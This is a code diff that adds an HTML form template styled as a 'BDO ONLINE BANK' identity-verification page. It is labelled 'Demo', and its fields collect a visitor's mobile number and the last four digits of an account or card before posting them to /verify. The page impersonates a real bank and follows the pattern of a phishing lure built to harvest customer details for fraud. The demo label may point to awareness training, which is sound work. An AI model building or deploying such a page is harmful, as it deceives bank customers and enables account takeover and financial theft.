@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Verification — Demo</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='demo.css') }}">
+</head>
+<body>
+  <div class="wrap">
+    <div class="hero"><img src="{{ url_for('static', filename='hero.png') }}" alt="hero"></div>
+    <div class="panel">
+      <div class="demo-banner">BDO ONLINE BANK</div>
+      <h2>We need to make sure it's you</h2>
+      <form method="post" action="/verify">
+        <label>Mobile Number</label>
+        <input name="mobile" type="text" placeholder="09XXXXXXXXX" required>
+        <label>Last 4 digits of account/card</label>
+        <input name="last4" type="text" maxlength="4" required>
+        <button class="btn" type="submit">Next</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
